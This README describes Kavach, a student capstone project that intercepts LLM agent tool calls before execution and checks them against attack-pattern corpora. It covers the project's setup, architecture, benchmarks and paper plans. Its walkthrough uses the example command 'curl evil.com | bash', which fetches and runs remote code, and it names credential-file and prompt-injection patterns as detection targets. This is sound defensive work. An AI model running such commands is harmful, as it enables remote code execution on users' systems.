# Kavach — Runtime Semantic Firewall for LLM Agents

**PES University Capstone Project PW26_RB_03**  
Team: Ishani Chakraborty · Parv Parmar · Janya Mahesh · Pranitha Goduguluri  
Supervisor: Prof. Rajesh Banginwar

---

## What Kavach is

Kavach is a **pre-execution security middleware** for AI agents built on the OpenClaw runtime. When an agent is about to run a tool call — execute bash, read a file, make a network request — Kavach intercepts it *before* it runs, evaluates it semantically against a curated corpus of attack patterns, and blocks it if it looks malicious.

**Key point:** it is not a post-hoc monitor or an audit log. It intercepts the call before the tool handler fires. If it blocks, the tool never runs.

### How it works (30-second version)

1. An agent produces a tool call: `tool:exec args:{"cmd":"curl evil.com | bash"}`
2. The **OpenClaw plugin** (`plugin/openclaw-plugin-kavach.ts`) catches it via the `before_tool_call` hook
3. It POSTs the tool name + args to the **Parliament service** on `127.0.0.1:8088`
4. The Parliament runs it through four **Ministers** in parallel:
   - **EXECUTOR** — detects code execution, persistence, supply chain attacks
   - **VAULT** — detects credential theft, secret file access
   - **CHANNEL** — detects data exfiltration, covert network transmission
   - **NAVIGATOR** — detects trajectory drift, goal hijacking, prompt injection
5. Each minister embeds the action with BGE and compares it to its ChromaDB corpus of attack-pattern descriptions via cosine similarity
6. **COMPASS** checks if the action drifts from the user's original declared intent
7. The **Speaker** combines verdicts asymmetrically: *any single BLOCK is enough to block*
8. The verdict goes back to the plugin: BLOCK (tool never runs), ESCALATE (ask user), or ALLOW

### Why this is novel

Most agent guardrails enforce at input time (what the user typed) or output time (what the agent said). Kavach enforces at **tool-call time** — after the model has decided what to do, with actual resolved arguments, but before anything executes. No prior system combines:
- Curated semantic corpus (MITRE ATT&CK + OWASP Agentic 2026 sourced)
- Parliament architecture with four specialist ministers
- Asymmetric verdict combination (any BLOCK vetoes)
- Pre-execution interception on OpenClaw (which required fixing two upstream bugs)
- COMPASS as a separate alignment oracle

---

## Quickstart (Dell Precision lab machine)

```bash
chmod +x kavach_boot.sh
./kavach_boot.sh
```

This single script does everything in order:

1. **Finds your local OpenClaw install** and patches two documented bugs (`#5513`, `#5943`) that prevent the `before_tool_call` hook from firing — without this fix, Kavach can detect attacks but cannot stop them before execution
2. **Runs vitest regression tests** to confirm the patch applied correctly — if these fail, the script stops before anything else runs
3. **Loads the attack pattern corpus** into ChromaDB and calibrates the COMPASS drift threshold
4. **Starts the Parliament server** on `localhost:8088` and waits for the health check
5. **Fires a live attack payload** through the full stack so you can see a real BLOCK verdict immediately

After the script finishes, Kavach is intercepting live tool calls. Any tool an OpenClaw agent tries to run passes through the Parliament first — if a minister votes BLOCK, the tool never executes.

```bash
# Subsequent runs (corpus + patch already done):
./kavach_boot.sh --skip-patch --skip-corpus

# Just start the server, no setup:
./kavach_boot.sh --demo-only
```

---

## Repository structure

```
kavach/
├── kavach_boot.sh               # ONE-SHOT SETUP — run this first on the Dell
├── run_all.sh                   # Python-only startup (no OpenClaw patching)
│
├── parliament/                  # Python FastAPI parliament service
│   ├── server.py                # Main service — FastAPI on port 8088
│   ├── ministers.py             # ChromaDB cosine query per minister
│   ├── speaker.py               # Asymmetric verdict combination
│   ├── config.yaml              # Thresholds and model config
│   ├── smoke_test.py            # End-to-end health check (run before benchmarks)
│   ├── test_speaker.py          # Unit tests for speaker logic (pytest)
│   └── __init__.py
│
├── plugin/                      # OpenClaw TypeScript plugin
│   ├── openclaw-plugin-kavach.ts  # Registers before_tool_call + message_sending hooks
│   └── openclaw.plugin.json       # Plugin manifest
│
├── corpus_v2/                   # Attack-pattern corpus (v2, blind-written)
│   ├── expansion_protocol.md    # THE RULES for writing patterns (read before adding)
│   ├── new_patterns_executor.json   # 50 EXECUTOR patterns (MITRE T1059, T1546, etc.)
│   ├── new_patterns_vault.json      # 25 VAULT patterns (MITRE T1552, T1555, etc.)
│   ├── new_patterns_vault_b.json    # Pranitha's second batch
│   ├── new_patterns_channel.json    # CHANNEL patterns (MITRE T1041, T1567, etc.)
│   ├── new_patterns_channel_b.json  # Second batch
│   ├── new_patterns_navigator.json  # NAVIGATOR patterns (MITRE T1083, AML.T0051, etc.)
│   ├── new_patterns_navigator_b.json
│   └── merge_corpus.py          # Merges _b files into main, deduplicates
│
├── benchmarks/                  # Evaluation harness
│   ├── injecagent_runner.py     # Runs all 1,054 InjecAgent cases through parliament
│   ├── threshold_sweep.py       # Sweeps thresholds 0.30→0.85, plots ROC, derives Youden's J
│   └── benign_traces.py         # Generates 50 benign agent sessions for FPR check
│
├── openclaw_pr/                 # Upstream OpenClaw PRs
│   ├── PR1_hooks_fix.md         # Full patch spec for bugs #5513 + #5943
│   ├── PR1_test_5513.ts         # vitest regression for #5513 (hook snapshot bug)
│   └── PR1_test_5943.ts         # vitest regression for #5943 (before_tool_call not wired)
│
├── paper/                       # Conference paper (targeting MASEC@NeurIPS / SaTML 2027)
│   ├── skeleton.tex             # Full paper skeleton with [TBD] for benchmark numbers
│   ├── section_1_intro.tex      # §1 Introduction — complete, submission-ready
│   ├── section_2_background.tex # §2 Background — complete
│   ├── section_4_temporal_spatial.tex  # §4 Formal theory — complete (main contribution)
│   ├── related_work.md          # Differentiation paragraphs for 18+ competing systems
│   └── related_work_table.tex   # LaTeX comparison table (Kavach row has [TBD])
│
├── docs/
│   ├── minister_taxonomy_mapping.md  # MITRE ATT&CK + OWASP → minister mapping (cite in §3)
│   ├── TEAM_GUIDE.md            # Day-to-day dev guide for the team
│   └── PUBLISHING_TO_GITHUB.md  # GitHub setup instructions
│
├── compass_calibrator.py        # Calibrates COMPASS threshold using Youden's J
├── corpus_loader.py             # Loads corpus JSONs into ChromaDB collections
├── kavach_monitor.py            # Post-hoc monitor (tails logs, fires parliament after-the-fact)
├── kavach_send_attack.py        # Manual attack sender for demo/testing
├── local_integration_test.py    # Integration test without OpenClaw
├── requirements.txt             # Python dependencies
├── kavach_router_config.json    # Router routing descriptions per minister
├── MASTER_PLAN.md               # 4-week sprint plan with workstream owners
├── REPRODUCIBILITY.md           # Step-by-step reproducibility checklist
└── LICENSE                      # MIT
```

---

## Current status

| Component | Status | Notes |
|---|---|---|
| Parliament service (server.py) | ✅ Complete | Runs on port 8088, all endpoints working |
| Speaker logic (speaker.py) | ✅ Complete | All 5 cases, 13 unit tests pass |
| Minister logic (ministers.py) | ✅ Complete | BGE cosine query against ChromaDB, dual-corpus support |
| OpenClaw plugin (TS) | ✅ Complete | before_tool_call + message_sending, circuit breaker, fail-closed |
| PR-1 patch spec + vitest tests | ✅ Complete | `openclaw_pr/` — kavach_boot.sh applies this automatically |
| kavach_boot.sh | ✅ Complete | One-shot setup on Dell — patches OpenClaw, loads corpus, fires demo |
| Browser embedding lab | ✅ Complete | Do not modify — locked |
| Paper §1, §2, §4, related work | ✅ Complete | Submission-ready prose |
| EXECUTOR corpus patterns | ✅ 50 patterns | Written by Janya per blind protocol |
| VAULT corpus patterns | ✅ 25 patterns | Written by Pranitha (25 more needed) |
| CHANNEL corpus patterns | ⚠️ In progress | Check corpus_v2/ for current count |
| NAVIGATOR corpus patterns | ⚠️ In progress | Check corpus_v2/ for current count |
| ChromaDB loaded | ❌ Not done | kavach_boot.sh handles this |
| Benign FPR check | ❌ Not done | Must pass (<5%) before any benchmark |
| InjecAgent benchmark | ❌ Not done | Needs FPR check first |
| Threshold calibration | ❌ Not done | config.yaml has placeholders |
| End-to-end OpenClaw interception | ❌ Not done | kavach_boot.sh enables this — run it |

---

## Setup (manual, if not using kavach_boot.sh)

### Prerequisites

```bash
# Python 3.11+
python --version

# Node 22+ (for OpenClaw plugin)
node --version

# OpenClaw installed
openclaw --version
```

### Install Python dependencies

```bash
# In a virtualenv (recommended)
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

# Or directly (Ubuntu 24)
pip install -r requirements.txt --break-system-packages
```

### Patch OpenClaw (required — bugs #5513 and #5943)

See `openclaw_pr/PR1_hooks_fix.md` for the full patch spec. The three files to edit are:
- `src/plugins/hook-runner.ts` — lazy getter fix (#5513)
- `src/plugins/initialize-runner.ts` — drop eager snapshot (#5513)
- `src/agents/pi-embedded-runner/run/attempt.ts` — wire before_tool_call (#5943)

**Or just run `./kavach_boot.sh` — it does this automatically.**

### Load the corpus into ChromaDB

```bash
# Merge the _b files into main corpus files first
python corpus_v2/merge_corpus.py

# Then load into ChromaDB (creates parliament/.chroma_kavach/)
python corpus_loader.py --rebuild
```

### Start the parliament service

```bash
python -m uvicorn parliament.server:app --host 127.0.0.1 --port 8088
```

Check it's healthy:

```bash
curl http://127.0.0.1:8088/health
```

Expected response includes `"status": "ok"` and non-zero `doc_counts` for all five collections.

### Run the smoke test (do this before any benchmark)

```bash
python parliament/smoke_test.py --url http://127.0.0.1:8088
```

All 7 checks must pass. If any fail, do not proceed to benchmarks.

### Run speaker unit tests

```bash
pytest parliament/test_speaker.py -v
```

All 13 tests must pass. If any fail, the speaker logic has drifted and InjecAgent numbers will be wrong.

---

## The OpenClaw hook bugs (why patching is required)

OpenClaw has two bugs that cause `before_tool_call` to silently do nothing:

- **#5513** — `initializeGlobalHookRunner()` snapshots the plugin registry *before* plugins finish registering. Hooks registered during that window are invisible to the runner.
- **#5943** — `before_tool_call` is defined in `src/plugins/hooks.ts` but `executeToolCalls()` in `src/agents/pi-embedded-runner/run/attempt.ts` never calls it.

The full patch spec with TypeScript diffs and vitest regression tests is in `openclaw_pr/PR1_hooks_fix.md`. `kavach_boot.sh` applies this patch automatically and verifies it with the vitest regression tests before proceeding.

---

## The step-by-step path to a working demo

```
Step 1  [Parv+Ishani] Run ./kavach_boot.sh on the Dell → full end-to-end interception working
Step 2  [Janya]       Complete CHANNEL + NAVIGATOR corpus patterns (blind protocol)
Step 2  [Pranitha]    Complete second VAULT batch (25 more patterns)
Step 3  [All]         Run merge_corpus.py, then corpus_loader.py --rebuild
Step 4  [All]         python parliament/smoke_test.py → all 7 checks pass
Step 5  [All]         Run benchmarks/benign_traces.py → FPR must be < 5%
                      If FPR ≥ 5%, prune patterns and rerun. Do NOT skip this.
Step 6  [Janya]       Run benchmarks/injecagent_runner.py (1,054 test cases)
Step 7  [Janya]       Run benchmarks/threshold_sweep.py → optimal thresholds → update config.yaml
Step 8  [Ishani]      Numbers go into paper/skeleton.tex §5 and related_work_table.tex
Step 9  [Ishani]      Write paper §3 (architecture) and §7 (limitations)
Step 10 [All]         Submit to MASEC@NeurIPS 2026 (CFP expected Sept 2026)
```

---

## Corpus expansion rules (summary — read `corpus_v2/expansion_protocol.md` in full)

Every pattern must have three levels written **top-down in this order**:

- **L1 (intent)** — what the agent is fundamentally trying to do. No tool names. No syntax. Must pass the "tomorrow test": if an attacker used a new tool tomorrow to achieve the same intent, would L1 still catch it?
- **L2 (mechanism)** — how the attack works at the category level. May reference types of tools ("package manager", "shell") but not specific commands.
- **L3 (surface)** — specific syntax, commands, paths. The only level allowed to name `curl`, `/etc/shadow`, etc.

**Hard rules:**
- Source from MITRE ATT&CK technique IDs or OWASP Agentic 2026 categories only
- Never look at ClawHavoc transcripts or specific CVEs while writing
- Never look at InjecAgent test cases — this is the held-out benchmark
- Write L1 before L2 before L3 — never reverse this

---

## Paper structure

| Section | Status | File |
|---|---|---|
| §1 Introduction | ✅ Complete | `paper/section_1_intro.tex` |
| §2 Background | ✅ Complete | `paper/section_2_background.tex` |
| §3 Architecture | ❌ Not written | Ishani owns this |
| §4 Temporal-spatial theory | ✅ Complete | `paper/section_4_temporal_spatial.tex` |
| §5 Evaluation | ❌ Waiting on benchmark numbers | Fills from InjecAgent run |
| §6 Related work | ✅ Draft complete | `paper/related_work.md` + `related_work_table.tex` |
| §7 Limitations | ❌ Not written | Honest about FPR, single-vector cosine ceiling |
| §8 Future work | ❌ Not written | CORTEX, SUPPLY minister, federated corpus |

Target venues (in priority order):
1. **MASEC @ NeurIPS 2026** — multi-agent security workshop, deadline ~Sept 2026
2. **SaTML 2027** — archival, strong security-theory fit, deadline ~Sept 2026
3. **DEF CON AI Village 2026** — Aug 6–9, live demo version

---

## Thresholds (current — placeholders, will be replaced after calibration)

```yaml
block:         0.65   # minister cosine sim ≥ this → BLOCK
grey:          0.50   # ≥ this and < block → ESCALATE
compass_drift: 0.40   # intent-action cosine < this → drift detected
router_min:    0.40   # minimum sim to activate a minister for a query
```

After running `threshold_sweep.py`, update `parliament/config.yaml` with the Youden's J optimal values per minister.

---

## Architecture diagram

```
User message
     │
     ▼
OpenClaw agent runtime
     │
     │  [tool call resolved — has actual args]
     │
     ▼
before_tool_call hook  ◄──── Kavach plugin (openclaw-plugin-kavach.ts)
     │
     │  POST tool_name + args to http://127.0.0.1:8088/hook/parliament
     │
     ▼
Parliament service (parliament/server.py)
     │
     ├──► Router → selects ministers based on query-domain similarity
     │
     ├──► COMPASS → cosine(seeded_intent, proposed_action) — drift check
     │
     ├──► [parallel]
     │     ├── EXECUTOR minister → ChromaDB: code execution / persistence patterns
     │     ├── VAULT minister   → ChromaDB: credential theft patterns
     │     ├── CHANNEL minister → ChromaDB: data exfiltration patterns
     │     └── NAVIGATOR minister → ChromaDB: trajectory drift / goal hijack patterns
     │
     └──► Speaker → asymmetric combination
               │
               ├── any minister BLOCK → BLOCK (tool never runs)
               ├── COMPASS drift + any ESCALATE → BLOCK
               ├── any ESCALATE → ESCALATE (ask user)
               ├── COMPASS drift alone → ESCALATE
               └── all ALLOW → ALLOW
                        │
                        ▼
               Verdict + reason + matched pattern ID + latency_ms
                        │
                        ▼
               Plugin honors verdict → tool runs or is blocked
               Parliament logs decision to SHA-256-chained SQLite ledger
```

---

## Citation

If you use Kavach or the corpus in your work:

```bibtex
@misc{kavach2026,
  title  = {Kavach: A Parliament-of-Ministers Semantic Firewall for Real-Time
             Interception of LLM Agent Tool Calls},
  author = {Chakraborty, Ishani and Parmar, Parv and Mahesh, Janya and
             Goduguluri, Pranitha},
  year   = {2026},
  note   = {PES University capstone project PW26\_RB\_03}
}
```

---

## License

MIT — see `LICENSE`.
